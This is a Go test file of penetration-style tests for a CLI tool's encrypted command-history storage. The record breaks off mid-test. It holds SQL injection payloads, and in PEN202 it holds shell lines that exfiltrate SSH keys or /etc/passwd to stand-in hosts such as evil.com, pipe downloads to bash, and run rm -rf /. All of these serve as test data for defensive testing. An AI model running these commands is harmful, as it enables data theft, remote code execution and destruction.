package security

import (
	"bytes"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/NeverVane/commandchronicles-cli/internal/config"
	"github.com/NeverVane/commandchronicles-cli/internal/storage"
	"github.com/NeverVane/commandchronicles-cli/pkg/crypto"
	"github.com/NeverVane/commandchronicles-cli/pkg/security"
	secureStorage "github.com/NeverVane/commandchronicles-cli/pkg/storage"
)

// TestPenetration_FileSystemAttacks simulates file system based attacks
func TestPenetration_FileSystemAttacks(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Skipping file system penetration tests on Windows")
	}

	t.Run("PEN001_DatabaseFileCorruption", func(t *testing.T) {
		// Simulate attacker corrupting database file
		tmpDir := t.TempDir()
		cfg := createPenetrationTestConfig(tmpDir)

		ss, err := secureStorage.NewSecureStorage(&secureStorage.StorageOptions{
			Config:          cfg,
			CreateIfMissing: true,
		})
		require.NoError(t, err)
		defer ss.Close()

		// Store legitimate data
		err = ss.Unlock("victim", "victim_password_123")
		require.NoError(t, err)

		record := storage.NewCommandRecord("legitimate command", 0, 100, "/tmp", "session", "host")
		_, err = ss.Store(record)
		require.NoError(t, err)

		err = ss.Lock()
		require.NoError(t, err)

		// Simulate attacker corrupting database
		dbPath := filepath.Join(tmpDir, "data", "history.db")
		if _, err := os.Stat(dbPath); err == nil {
			// Read original data
			originalData, err := os.ReadFile(dbPath)
			require.NoError(t, err)

			corruptionTests := []struct {
				name   string
				attack func([]byte) []byte
			}{
				{
					name: "random_byte_flip",
					attack: func(data []byte) []byte {
						corrupted := make([]byte, len(data))
						copy(corrupted, data)
						if len(corrupted) > 100 {
							// Flip random bytes
							for i := 0; i < 10; i++ {
								pos := 50 + i*10
								if pos < len(corrupted) {
									corrupted[pos] ^= 0xFF
								}
							}
						}
						return corrupted
					},
				},
				{
					name: "header_corruption",
					attack: func(data []byte) []byte {
						corrupted := make([]byte, len(data))
						copy(corrupted, data)
						// Corrupt SQLite header
						if len(corrupted) >= 16 {
							copy(corrupted[0:16], "CORRUPTED_HEADER")
						}
						return corrupted
					},
				},
				{
					name: "truncation_attack",
					attack: func(data []byte) []byte {
						if len(data) <= 100 {
							return []byte{}
						}
						return data[:len(data)/2]
					},
				},
				{
					name: "injection_attack",
					attack: func(data []byte) []byte {
						corrupted := make([]byte, len(data))
						copy(corrupted, data)
						// Try to inject malicious SQL
						maliciousSQL := []byte("'; DROP TABLE history; --")
						if len(corrupted) > len(maliciousSQL)+100 {
							copy(corrupted[100:100+len(maliciousSQL)], maliciousSQL)
						}
						return corrupted
					},
				},
			}

			for _, test := range corruptionTests {
				t.Run(test.name, func(t *testing.T) {
					// Apply corruption
					corruptedData := test.attack(originalData)
					err := os.WriteFile(dbPath, corruptedData, 0600)
					require.NoError(t, err)

					// Try to access with corrupted database
					corruptCfg := createPenetrationTestConfig(tmpDir)
					ss2, err := secureStorage.NewSecureStorage(&secureStorage.StorageOptions{
						Config:          corruptCfg,
						CreateIfMissing: false,
					})

					if err == nil {
						defer ss2.Close()
						
						// Should either fail to unlock or detect corruption
						err = ss2.Unlock("victim", "victim_password_123")
						if err == nil {
							// If unlock succeeds, integrity check should fail
							err = ss2.ValidateIntegrity()
							assert.Error(t, err, "Integrity check should detect corruption")
						}
					}

					// Restore original data for next test
					err = os.WriteFile(dbPath, originalData, 0600)
					require.NoError(t, err)
				})
			}
		}
	})

	t.Run("PEN002_PermissionEscalationAttack", func(t *testing.T) {
		// Simulate attacker trying to escalate file permissions
		// Threat: Attacker attempts to escalate file permissions
		tmpDir := t.TempDir()
		pe := security.NewPermissionEnforcer()
		dataDir := filepath.Join(tmpDir, "data")
		dbPath := filepath.Join(dataDir, "history.db")
		sessionPath := filepath.Join(dataDir, "session.key")

		err := pe.SecureDataEnvironment(tmpDir, dataDir, dbPath, sessionPath)
		require.NoError(t, err)

		// Create files with secure permissions
		err = os.WriteFile(dbPath, []byte("encrypted_data"), 0600)
		require.NoError(t, err)

		// Simulate attacker attempts
		attackScenarios := []struct {
			name        string
			targetFile  string
			newMode     os.FileMode
			expectError bool
		}{
			{"make_world_readable", dbPath, 0644, true},
			{"make_world_writable", dbPath, 0646, true},
			{"make_executable", dbPath, 0700, true},
			{"remove_owner_read", dbPath, 0200, true},
		}

		for _, scenario := range attackScenarios {
			t.Run(scenario.name, func(t *testing.T) {
				// Attacker changes permissions
				err := os.Chmod(scenario.targetFile, scenario.newMode)
				if err == nil {
					// Security system should detect and reject insecure permissions
					err = pe.AuditFilePermissions(scenario.targetFile)
					if scenario.expectError {
						assert.Error(t, err, "Should detect insecure permissions")
					}

					// Automatically fix permissions
					err = pe.FixFilePermissions(scenario.targetFile)
					assert.NoError(t, err, "Should be able to fix permissions")

					// Verify permissions are restored
					stat, err := os.Stat(scenario.targetFile)
					require.NoError(t, err)
					assert.Equal(t, os.FileMode(0600), stat.Mode().Perm(),
						"Permissions should be restored to secure state")
				}
			})
		}
	})

	t.Run("PEN003_SymlinkAttack", func(t *testing.T) {
		// Simulate symlink attack to access sensitive files
		tmpDir := t.TempDir()

		// Create sensitive file outside data directory
		sensitiveDir := filepath.Join(tmpDir, "sensitive")
		require.NoError(t, os.Mkdir(sensitiveDir, 0700))

		sensitiveFile := filepath.Join(sensitiveDir, "secrets.txt")
		sensitiveContent := "TOP_SECRET_CREDENTIALS"
		require.NoError(t, os.WriteFile(sensitiveFile, []byte(sensitiveContent), 0600))

		// Create data directory
		dataDir := filepath.Join(tmpDir, "data")
		require.NoError(t, os.Mkdir(dataDir, 0700))

		// Attacker creates symlink
		symlinkPath := filepath.Join(dataDir, "history.db")
		err := os.Symlink(sensitiveFile, symlinkPath)
		require.NoError(t, err)

		// Security system should detect symlink
		pe := security.NewPermissionEnforcer()

		// Check if symlink is detected
		stat, err := os.Lstat(symlinkPath)
		require.NoError(t, err)

		if stat.Mode()&os.ModeSymlink != 0 {
			// Should reject symlink access through file operations
			info, err := pe.GetFilePermissionInfo(symlinkPath)
			if err == nil && info.Mode&os.ModeSymlink != 0 {
				assert.True(t, true, "Symlink detected correctly")
			}

			// Should not be able to read sensitive data through symlink
			cfg := createPenetrationTestConfig(tmpDir)
			_, err = secureStorage.NewSecureStorage(&secureStorage.StorageOptions{
				Config:              cfg,
				ValidatePermissions: true,
				CreateIfMissing:     false,
			})
			assert.Error(t, err, "Should not create storage with symlinked database")
		}
	})
}

// TestPenetration_CryptographicAttacks simulates crypto-based attacks
func TestPenetration_CryptographicAttacks(t *testing.T) {
	t.Run("PEN101_KeyBruteForceAttack", func(t *testing.T) {
		// Simulate brute force attack on encryption key
		encryptor := crypto.NewEncryptor()
		kd := crypto.NewKeyDerivator()

		// Create legitimate encrypted data
		realKey, err := kd.DeriveKeyFromCredentials("user", "secure_password_123")
		require.NoError(t, err)
		defer realKey.SecureErase()

		plaintext := []byte("sensitive command data")
		ciphertext, err := encryptor.EncryptBytes(plaintext, realKey.Key)
		require.NoError(t, err)

		// Simulate brute force attempts
		bruteForceAttempts := [][]byte{
			make([]byte, 32),                          // All zeros
			bytes.Repeat([]byte{0xFF}, 32),            // All ones
			[]byte("password"),                        // Too short
			bytes.Repeat([]byte{0x01}, 32),            // Weak pattern
			[]byte("1234567890123456789012345678901"), // Predictable
		}

		// Fill with random data for some attempts
		for i := 0; i < 5; i++ {
			randomKey := make([]byte, 32)
			rand.Read(randomKey)
			bruteForceAttempts = append(bruteForceAttempts, randomKey)
		}

		successfulDecryptions := 0

		for i, fakeKey := range bruteForceAttempts {
			// Try to decrypt with fake key
			_, err := encryptor.DecryptBytes(ciphertext, fakeKey)
			if err == nil {
				successfulDecryptions++
				t.Logf("WARNING: Brute force attempt %d succeeded with key %x", i, fakeKey)
			}
		}

		// Should have very low success rate (ideally 0)
		assert.Equal(t, 0, successfulDecryptions,
			"Brute force attacks should not succeed")
	})

	t.Run("PEN102_NonceReuseAttack", func(t *testing.T) {
		// Simulate nonce reuse attack
		encryptor := crypto.NewEncryptor()
		kd := crypto.NewKeyDerivator()

		key, err := kd.DeriveKeyFromCredentials("user", "password123")
		require.NoError(t, err)
		defer key.SecureErase()

		// The system should always generate random nonces, preventing reuse

		// The system should generate random nonces, making reuse extremely unlikely
		var nonces [][]byte
		for i := 0; i < 1000; i++ {
			generatedNonce, err := encryptor.GenerateNonce()
			require.NoError(t, err)
			nonces = append(nonces, generatedNonce)
		}

		// Check for any nonce collisions
		nonceMap := make(map[string]bool)
		collisions := 0

		for _, nonce := range nonces {
			nonceStr := hex.EncodeToString(nonce)
			if nonceMap[nonceStr] {
				collisions++
			}
			nonceMap[nonceStr] = true
		}

		assert.Equal(t, 0, collisions, "Should not have nonce collisions")

		// Verify nonces are not predictable
		for i := 1; i < len(nonces); i++ {
			assert.NotEqual(t, nonces[i-1], nonces[i],
				"Sequential nonces should be different")
		}
	})

	t.Run("PEN103_WeakKeyAttack", func(t *testing.T) {
		// Test resistance to weak key attacks
		encryptor := crypto.NewEncryptor()

		weakKeys := [][]byte{
			make([]byte, 32),               // All zeros
			bytes.Repeat([]byte{0xFF}, 32), // All ones
			bytes.Repeat([]byte{0xAA}, 32), // Repeating pattern
			bytes.Repeat([]byte{0x01}, 32), // Single bit pattern
		}

		testData := []byte("test encryption data")

		for i, weakKey := range weakKeys {
			t.Run(fmt.Sprintf("weak_key_%d", i), func(t *testing.T) {
				// System should reject weak keys
				_, err := encryptor.EncryptBytes(testData, weakKey)
				assert.Error(t, err, "Should reject weak key %x", weakKey)
			})
		}
	})

	t.Run("PEN104_TimingAttackOnDecryption", func(t *testing.T) {
		// Simulate timing attack on decryption
		encryptor := crypto.NewEncryptor()
		kd := crypto.NewKeyDerivator()

		key, err := kd.DeriveKeyFromCredentials("user", "password123")
		require.NoError(t, err)
		defer key.SecureErase()

		// Create valid ciphertext
		plaintext := []byte("timing attack test data")
		validCiphertext, err := encryptor.EncryptBytes(plaintext, key.Key)
		require.NoError(t, err)

		// Create invalid ciphertexts for timing attack
		invalidCiphertexts := [][]byte{
			validCiphertext[:len(validCiphertext)-1], // Truncated
			append(validCiphertext, 0x00),            // Extended
			make([]byte, len(validCiphertext)),       // Random data
		}
		rand.Read(invalidCiphertexts[2])

		// Modify valid ciphertext slightly
		modifiedCiphertext := make([]byte, len(validCiphertext))
		copy(modifiedCiphertext, validCiphertext)
		if len(modifiedCiphertext) > 50 {
			modifiedCiphertext[50] ^= 0x01 // Flip one bit
		}
		invalidCiphertexts = append(invalidCiphertexts, modifiedCiphertext)

		// Measure timing for valid decryption
		var validTimes []time.Duration
		for i := 0; i < 10; i++ {
			start := time.Now()
			_, err := encryptor.DecryptBytes(validCiphertext, key.Key)
			elapsed := time.Since(start)
			require.NoError(t, err)
			validTimes = append(validTimes, elapsed)
		}

		// Measure timing for invalid decryptions
		var invalidTimes []time.Duration
		for _, invalidCiphertext := range invalidCiphertexts {
			for i := 0; i < 3; i++ { // Fewer iterations for invalid data
				start := time.Now()
				_, err := encryptor.DecryptBytes(invalidCiphertext, key.Key)
				elapsed := time.Since(start)
				assert.Error(t, err, "Invalid ciphertext should fail")
				invalidTimes = append(invalidTimes, elapsed)
			}
		}

		// Calculate averages
		var validSum, invalidSum time.Duration
		for _, t := range validTimes {
			validSum += t
		}
		for _, t := range invalidTimes {
			invalidSum += t
		}

		validAvg := validSum / time.Duration(len(validTimes))
		invalidAvg := invalidSum / time.Duration(len(invalidTimes))

		// Timing should be relatively consistent to prevent timing attacks
		timingDiff := validAvg - invalidAvg
		if timingDiff < 0 {
			timingDiff = -timingDiff
		}

		// Allow reasonable variance but detect significant timing differences
		maxAllowedDiff := validAvg / 2 // 50% variance allowed
		assert.True(t, timingDiff <= maxAllowedDiff,
			"Timing attack vulnerability: valid=%v, invalid=%v, diff=%v",
			validAvg, invalidAvg, timingDiff)
	})
}

// TestPenetration_InjectionAttacks simulates injection-based attacks
func TestPenetration_InjectionAttacks(t *testing.T) {
	t.Run("PEN201_SQLInjectionAttack", func(t *testing.T) {
		// Comprehensive SQL injection attack simulation
		tmpDir := t.TempDir()
		cfg := createPenetrationTestConfig(tmpDir)

		ss, err := secureStorage.NewSecureStorage(&secureStorage.StorageOptions{
			Config:          cfg,
			CreateIfMissing: true,
		})
		require.NoError(t, err)
		defer ss.Close()

		err = ss.Unlock("attacker", "attacker_password_123")
		require.NoError(t, err)

		// Advanced SQL injection payloads
		sqlInjectionPayloads := []string{
			// Classic injection attempts
			"'; DROP TABLE history; --",
			"' OR '1'='1",
			"' OR 1=1 --",
			"'; DELETE FROM history; --",

			// Union-based attacks
			"' UNION SELECT sqlite_version(), null, null, null, null, null --",
			"' UNION ALL SELECT name FROM sqlite_master WHERE type='table' --",

			// Boolean-based blind injection
			"' AND (SELECT COUNT(*) FROM history) > 0 --",
			"' AND (SELECT LENGTH(sql) FROM sqlite_master WHERE name='history') > 50 --",

			// Time-based blind injection
			"'; SELECT CASE WHEN (1=1) THEN (SELECT SLEEP(5)) ELSE 0 END --",

			// Error-based injection
			"' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM history GROUP BY x)a) --",

			// Stacked queries
			"'; INSERT INTO history VALUES (999999, 'injected', 0, 'evil', 'evil', 0); --",

			// Advanced payloads
			"' OR SUBSTR((SELECT sql FROM sqlite_master WHERE name='history'),1,1)='C' --",
			"'; ATTACH DATABASE '/etc/passwd' AS etc; --",
			"'; CREATE TABLE evil AS SELECT * FROM history; --",
		}

		attackResults := struct {
			successfulInjections int
			databaseCorrupted    bool
			dataExfiltrated      bool
			unauthorizedAccess   bool
		}{}

		for i, payload := range sqlInjectionPayloads {
			t.Run(fmt.Sprintf("injection_%d", i), func(t *testing.T) {
				// Store the injection payload
				record := storage.NewCommandRecord(payload, 0, 100, "/tmp", "session", "host")

				_, err := ss.Store(record)
				if err != nil {
					// Good - system rejected malicious input
					return
				}

				// Check if injection was successful
				err = ss.ValidateIntegrity()
				if err != nil {
					attackResults.databaseCorrupted = true
					t.Errorf("SQL injection caused database corruption: %s", payload)
				}

				// Try to retrieve data and check for anomalies
				result, err := ss.Retrieve(&secureStorage.QueryOptions{Limit: 1000})
				if err != nil {
					return
				}

				// Check for signs of successful injection
				for _, r := range result.Records {
					if r.Command != payload {
						// Different command found - possible injection success
						if strings.Contains(r.Command, "injected") ||
							strings.Contains(r.Command, "evil") {
							attackResults.successfulInjections++
							attackResults.unauthorizedAccess = true
							t.Errorf("SQL injection succeeded: %s resulted in: %s", payload, r.Command)
						}
					}
				}

				// Check for data exfiltration signs
				if len(result.Records) > 100 { // Unusually high number
					attackResults.dataExfiltrated = true
				}
			})
		}

		// Verify attack was unsuccessful
		assert.Equal(t, 0, attackResults.successfulInjections,
			"No SQL injections should succeed")
		assert.False(t, attackResults.databaseCorrupted,
			"Database should not be corrupted by injection attempts")
		assert.False(t, attackResults.dataExfiltrated,
			"No data should be exfiltrated through injection")
		assert.False(t, attackResults.unauthorizedAccess,
			"No unauthorized access should occur")
	})

	t.Run("PEN202_CommandInjectionAttack", func(t *testing.T) {
		// Test command injection resistance in stored commands
		tmpDir := t.TempDir()
		cfg := createPenetrationTestConfig(tmpDir)

		ss, err := secureStorage.NewSecureStorage(&secureStorage.StorageOptions{
			Config:          cfg,
			CreateIfMissing: true,
		})
		require.NoError(t, err)
		defer ss.Close()

		err = ss.Unlock("cmdattacker", "password123")
		require.NoError(t, err)

		// Command injection payloads that might be dangerous if executed
		dangerousCommands := []string{
			"rm -rf / #",
			"curl http://evil.com/$(cat ~/.ssh/id_rsa)",
			"echo $(whoami) | nc attacker.com 4444",
			"python -c \"import os; os.system('rm -rf /')\"",
			"bash -c 'curl -X POST -d @/etc/passwd http://evil.com'",
			"$(wget -O - http://evil.com/backdoor.sh | bash)",
			"eval \"$(curl -s http://malicious.com/payload)\"",
		}

		for _, cmd := range dangerousCommands {
			// Store dangerous command as history
			record := storage.NewCommandRecord(cmd, 0, 100, "/tmp", "session", "host")
			_, err := ss.Store(record)
			require.NoError(t, err, "Should store dangerous command safely")

			// Retrieve and verify it's stored as literal text
			result, err := ss.Retrieve(&secureStorage.QueryOptions{Limit: 10})
			require.NoError(t, err)

			// Find our command
			found := false
			for _, r := range result.Records {
				if r.Command == cmd {
					found = true
					// Verify exact match - no modification or execution
					assert.Equal(t, cmd, r.Command,
						"Command should be stored exactly as provided")
					break
				}
			}
			assert.True(t, found, "Dangerous command should be stored safely")

			// Verify system integrity after storing dangerous command
			err = ss.ValidateIntegrity()
			assert.NoError(t, err, "System integrity should be maintained")
		}
	})
}

// TestPenetration_SessionAttacks simulates session-based attacks
func TestPenetration_SessionAttacks(t *testing.T) {
	t.Run("PEN301_SessionHijackingAttack", func(t *testing.T) {
		// Simulate session hijacking attack
		tmpDir := t.TempDir()
		sessionPath := filepath.Join(tmpDir, "session.key")

		// Create session manager
		skm := crypto.NewSessionKeyManager(sessionPath, 30*time.Second)
		defer skm.Close()

		// Legitimate user creates session
		testKey := make([]byte, 32)
		rand.Read(testKey)

		err := skm.StoreSessionKey("legitimate_user", "secure_password_123", testKey)
		require.NoError(t, err)

		// Attacker attempts to hijack session

		// Attempt 1: Direct file access
		if _, err := os.Stat(sessionPath); err == nil {
			sessionData, err := os.ReadFile(sessionPath)
			if err == nil {
				// Attacker should not be able to extract usable key material
				assert.NotContains(t, sessionData, testKey,
					"Raw key material should not be extractable from session file")
			}
		}

		// Attempt 2: Wrong username attack
		_, err = skm.LoadSessionKey("attacker", "secure_password_123")
		assert.Error(t, err, "Wrong username should not access session")

		// Attempt 3: Wrong password attack
		_, err = skm.LoadSessionKey("legitimate_user", "wrong_password")
		assert.Error(t, err, "Wrong password should not access session")

		// Attempt 4: Brute force session file
		if _, err := os.Stat(sessionPath); err == nil {
			// Try to corrupt session file
			originalData, err := os.ReadFile(sessionPath)
			if err == nil {
				// Modify session file
				corruptedData := make([]byte, len(originalData))
				copy(corruptedData, originalData)
				if len(corruptedData) > 10 {
					// Flip some bits
					for i := 0; i < 10; i++ {
						corruptedData[i] ^= 0xFF
					}
				}

				err = os.WriteFile(sessionPath, corruptedData, 0600)
				require.NoError(t, err)

				// Should fail to load corrupted session
				_, err = skm.LoadSessionKey("legitimate_user", "secure_password_123")
				assert.Error(t, err, "Corrupted session should not be loadable")

				// Restore original for cleanup
				os.WriteFile(sessionPath, originalData, 0600)
			}
		}
	})

	t.Run("PEN302_SessionReplayAttack", func(t *testing.T) {
		// Test session timeout and replay protection
		tmpDir := t.TempDir()
		cfg := createPenetrationTestConfig(tmpDir)

		ss, err := secureStorage.NewSecureStorage(&secureStorage.StorageOptions{
			Config:          cfg,
			AutoLockTimeout: 1 * time.Second, // Very short timeout
			CreateIfMissing: true,
		})
		require.NoError(t, err)
		defer ss.Close()

		// Establish session
		err = ss.Unlock("replay_user", "password123")
		require.NoError(t, err)

		// Store some data
		record := storage.NewCommandRecord("test command", 0, 100, "/tmp", "session", "host")
		_, err = ss.Store(record)
		require.NoError(t, err)

		// Wait for session to expire
		time.Sleep(2 * time.Second)

		// Attempt to use expired session (replay attack)
		_, err = ss.Store(record)
		assert.Error(t, err, "Expired session should not allow operations")

		// Verify storage is locked
		assert.True(t, ss.IsLocked(), "Storage should be locked after timeout")

		// Should require re-authentication
		err = ss.Unlock("replay_user", "password123")
		require.NoError(t, err)

		// Now should work again
		_, err = ss.Store(record)
		assert.NoError(t, err, "Fresh session should work")
	})
}

// TestPenetration_ResourceExhaustionAttacks simulates DoS attacks
func TestPenetration_ResourceExhaustionAttacks(t *testing.T) {
	t.Run("PEN401_MemoryExhaustionAttack", func(t *testing.T) {
		// Simulate memory exhaustion attack
		encryptor := crypto.NewEncryptor()
		kd := crypto.NewKeyDerivator()

		key, err := kd.DeriveKeyFromCredentials("dos_user", "password123")
		require.NoError(t, err)
		defer key.SecureErase()

		// Try to exhaust memory with large allocations
		var memUsageBefore runtime.MemStats
		runtime.ReadMemStats(&memUsageBefore)

		// Attempt large data encryption
		attackSizes := []int{
			1024 * 1024,      // 1MB
			10 * 1024 * 1024, // 10MB
			50 * 1024 * 1024, // 50MB
		}

		for _, size := range attackSizes {
			t.Run(fmt.Sprintf("size_%dMB", size/(1024*1024)), func(t *testing.T) {
				largeData := make([]byte, size)
				rand.Read(largeData)

				start := time.Now()
				_, err := encryptor.EncryptBytes(largeData, key.Key)
				elapsed := time.Since(start)

				if err != nil {
					// Good - system rejected oversized data
					assert.Contains(t, strings.ToLower(err.Error()), "too large",
						"Should reject large data with appropriate error")
				} else {
					// If allowed, should complete in reasonable time
					maxTime := time.Duration(size/1024/1024) * time.Second // 1 second per MB
					assert.True(t, elapsed < maxTime,
						"Large data processing should complete in reasonable time")
				}

				// Check memory usage didn't explode
				var memUsageAfter runtime.MemStats
				runtime.ReadMemStats(&memUsageAfter)

				memIncrease := memUsageAfter.Alloc - memUsageBefore.Alloc
				maxMemIncrease := uint64(size * 3) // Allow 3x overhead

				if memIncrease > maxMemIncrease {
					t.Errorf("Memory usage increased too much: %d bytes (max: %d)",
						memIncrease, maxMemIncrease)
				}
			})
		}
	})

	t.Run("PEN402_ConcurrentConnectionAttack", func(t *testing.T) {
		// Simulate concurrent connection DoS attack
		tmpDir := t.TempDir()
		cfg := createPenetrationTestConfig(tmpDir)

		ss, err := secureStorage.NewSecureStorage(&secureStorage.StorageOptions{
			Config:          cfg,
			CreateIfMissing: true,
		})
		require.NoError(t, err)
		defer ss.Close()

		err = ss.Unlock("dos_user", "password123")
		require.NoError(t, err)

		// Launch many concurrent operations to exhaust resources
		const numAttackGoroutines = 200
		var wg sync.WaitGroup
		var errors []error
		var errorMu sync.Mutex

		addError := func(err error) {
			errorMu.Lock()
			defer errorMu.Unlock()
			errors = append(errors, err)
		}

		start := time.Now()

		for i := 0; i < numAttackGoroutines; i++ {
			wg.Add(1)
			go func(id int) {
				defer wg.Done()

				// Rapid-fire operations
				for j := 0; j < 10; j++ {
					record := storage.NewCommandRecord(
						fmt.Sprintf("dos-attack-%d-%d", id, j),
						0, 100, "/tmp", "dos-session", "dos-host")

					_, err := ss.Store(record)
					if err != nil {
						addError(err)
						return
					}
				}
			}(i)
		}

		wg.Wait()
		elapsed := time.Since(start)

		// System should handle load gracefully
		assert.True(t, elapsed < 60*time.Second,
			"DoS attack should not cause excessive delays: %v", elapsed)

		// Should not have excessive errors (some errors acceptable under load)
		errorRate := float64(len(errors)) / float64(numAttackGoroutines*10)
		assert.True(t, errorRate < 0.5,
			"Error rate too high under DoS attack: %.2f", errorRate)

		// System should still be functional
		err = ss.ValidateIntegrity()
		assert.NoError(t, err, "System should maintain integrity under DoS attack")
	})

	t.Run("PEN403_StorageSpaceExhaustionAttack", func(t *testing.T) {
		// Simulate storage space exhaustion attack
		tmpDir := t.TempDir()
		cfg := createPenetrationTestConfig(tmpDir)

		ss, err := secureStorage.NewSecureStorage(&secureStorage.StorageOptions{
			Config:          cfg,
			CreateIfMissing: true,
		})
		require.NoError(t, err)
		defer ss.Close()

		err = ss.Unlock("storage_attacker", "password123")
		require.NoError(t, err)

		// Try to fill storage with large records
		maxRecords := 10000
		largeCommand := strings.Repeat("A", 10000) // 10KB per record

		var storedCount int
		for i := 0; i < maxRecords; i++ {
			record := storage.NewCommandRecord(
				fmt.Sprintf("%s_%d", largeCommand, i),
				0, 100, "/tmp", "storage-attack", "host")

			_, err := ss.Store(record)
			if err != nil {
				// Good - system prevented storage exhaustion
				break
			}
			storedCount++

			// Stop if we've stored a reasonable amount (prevent test timeout)
			if storedCount >= 1000 {
				break
			}
		}

		// System should either limit storage or handle large amounts gracefully
		t.Logf("Stored %d large records before limit/error", storedCount)

		// Verify system is still functional
		err = ss.ValidateIntegrity()
		assert.NoError(t, err, "System should maintain integrity after storage attack")

		// Verify we can still perform normal operations
		normalRecord := storage.NewCommandRecord("normal command", 0, 100, "/tmp", "session", "host")
		_, err = ss.Store(normalRecord)
		assert.NoError(t, err, "Should still handle normal operations")
	})
}

// TestPenetration_PrivilegeEscalationAttacks simulates privilege escalation
func TestPenetration_PrivilegeEscalationAttacks(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Skipping privilege escalation tests on Windows")
	}

	t.Run("PEN501_FilePermissionBypass", func(t *testing.T) {
		// Test attempts to bypass file permission restrictions
		tmpDir := t.TempDir()

		// Create restricted file
		restrictedFile := filepath.Join(tmpDir, "restricted.db")
		err := os.WriteFile(restrictedFile, []byte("restricted data"), 0600)
		require.NoError(t, err)

		// Attacker tries various permission manipulation techniques
		attacks := []struct {
			name   string
			attack func() error
		}{
			{
				name: "chmod_attack",
				attack: func() error {
					return os.Chmod(restrictedFile, 0644)
				},
			},
			{
				name: "chown_attack",
				attack: func() error {
					// Try to change ownership (will likely fail without root)
					return os.Chown(restrictedFile, os.Getuid(), os.Getgid())
				},
			},
			{
				name: "hard_link_attack",
				attack: func() error {
					linkPath := filepath.Join(tmpDir, "hardlink")
					return os.Link(restrictedFile, linkPath)
				},
			},
		}

		pe := security.NewPermissionEnforcer()

		for _, attack := range attacks {
			t.Run(attack.name, func(t *testing.T) {
				// Perform attack
				attack.attack() // May succeed or fail

				// Security system should detect and fix insecure state
				err := pe.AuditFilePermissions(restrictedFile)
				if err != nil {
					// Fix permissions
					err = pe.FixFilePermissions(restrictedFile)
					assert.NoError(t, err, "Should be able to fix permissions")
				}

				// Verify secure state is restored
				stat, err := os.Stat(restrictedFile)
				require.NoError(t, err)
				assert.Equal(t, os.FileMode(0600), stat.Mode().Perm(),
					"Permissions should be secure after attack")
			})
		}
	})

	t.Run("PEN502_ProcessPrivilegeEscalation", func(t *testing.T) {
		// Test that the application doesn't escalate privileges inappropriately

		// Check effective user ID hasn't changed
		startUID := os.Getuid()
		startGID := os.Getgid()

		tmpDir := t.TempDir()
		cfg := createPenetrationTestConfig(tmpDir)

		ss, err := secureStorage.NewSecureStorage(&secureStorage.StorageOptions{
			Config:          cfg,
			CreateIfMissing: true,
		})
		require.NoError(t, err)
		defer ss.Close()

		err = ss.Unlock("privesc_user", "password123")
		require.NoError(t, err)

		// Perform various operations
		record := storage.NewCommandRecord("test command", 0, 100, "/tmp", "session", "host")
		_, err = ss.Store(record)
		require.NoError(t, err)

		// Verify privileges haven't escalated
		endUID := os.Getuid()
		endGID := os.Getgid()

		assert.Equal(t, startUID, endUID, "UID should not change")
		assert.Equal(t, startGID, endGID, "GID should not change")

		// Verify no setuid/setgid bits on created files
		dbPath := filepath.Join(tmpDir, "data", "history.db")
		if stat, err := os.Stat(dbPath); err == nil {
			mode := stat.Mode()
			assert.False(t, mode&os.ModeSetuid != 0, "Database should not have setuid bit")
			assert.False(t, mode&os.ModeSetgid != 0, "Database should not have setgid bit")
		}
	})
}

// TestPenetration_ComprehensiveAttackSimulation runs multiple attack vectors
func TestPenetration_ComprehensiveAttackSimulation(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Skipping comprehensive attack simulation on Windows")
	}

	t.Run("PEN901_MultiVectorAttackSimulation", func(t *testing.T) {
		// Simulate sophisticated attacker using multiple attack vectors
		tmpDir := t.TempDir()
		cfg := createPenetrationTestConfig(tmpDir)

		// Initialize secure storage
		ss, err := secureStorage.NewSecureStorage(&secureStorage.StorageOptions{
			Config:              cfg,
			AutoLockTimeout:     30 * time.Second,
			EnableSecureDelete:  true,
			ValidatePermissions: true,
			CreateIfMissing:     true,
		})
		require.NoError(t, err)
		defer ss.Close()

		// Legitimate user activity
		err = ss.Unlock("victim_user", "victim_secure_password_123")
		require.NoError(t, err)

		sensitiveCommands := []string{
			"export AWS_SECRET_ACCESS_KEY=super_secret_key_123",
			"mysql -u admin -p'database_password_456' production_db",
			"ssh -i ~/.ssh/production_rsa admin@production.server.com",
		}

		var legitimateIDs []int64
		for _, cmd := range sensitiveCommands {
			record := storage.NewCommandRecord(cmd, 0, 150, "/secure", "prod-session", "prod-host")
			result, err := ss.Store(record)
			require.NoError(t, err)
			legitimateIDs = append(legitimateIDs, result.RecordID)
		}

		err = ss.Lock()
		require.NoError(t, err)

		// Attack Phase 1: File system attacks
		dbPath := filepath.Join(tmpDir, "data", "history.db")

		// Try to read database directly
		if dbContent, err := os.ReadFile(dbPath); err == nil {
			// Should not find plaintext secrets
			for _, cmd := range sensitiveCommands {
				assert.NotContains(t, string(dbContent), cmd,
					"Plaintext command should not be visible in database file")
			}
		}

		// Try to modify file permissions
		os.Chmod(dbPath, 0644) // Make world-readable

		// Security system should detect and fix
		pe := security.NewPermissionEnforcer()
		err = pe.AuditFilePermissions(dbPath)
		if err != nil {
			err = pe.FixFilePermissions(dbPath)
			require.NoError(t, err)
		}

		// Attack Phase 2: Authentication attacks
		wrongCredentials := []struct{ user, pass string }{
			{"victim_user", "wrong_password"},
			{"admin", "admin"},
			{"victim_user", ""},
			{"", "victim_secure_password_123"},
		}

		for _, cred := range wrongCredentials {
			err = ss.Unlock(cred.user, cred.pass)
			assert.Error(t, err, "Wrong credentials should not work: %s/%s", cred.user, cred.pass)
		}

		// Attack Phase 3: Injection attacks
		err = ss.Unlock("victim_user", "victim_secure_password_123")
		require.NoError(t, err)

		maliciousCommands := []string{
			"'; DROP TABLE history; --",
			"$(rm -rf /)",
			"' OR 1=1 --",
			"'; ATTACH DATABASE '/etc/passwd' AS pwn; --",
		}

		for _, malCmd := range maliciousCommands {
			record := storage.NewCommandRecord(malCmd, 0, 100, "/tmp", "attack-session", "attack-host")
			_, err := ss.Store(record)
			// Should either reject or store safely
			if err == nil {
				// If stored, verify integrity
				err = ss.ValidateIntegrity()
				assert.NoError(t, err, "Integrity should be maintained after malicious input")
			}
		}

		// Attack Phase 4: DoS attempts
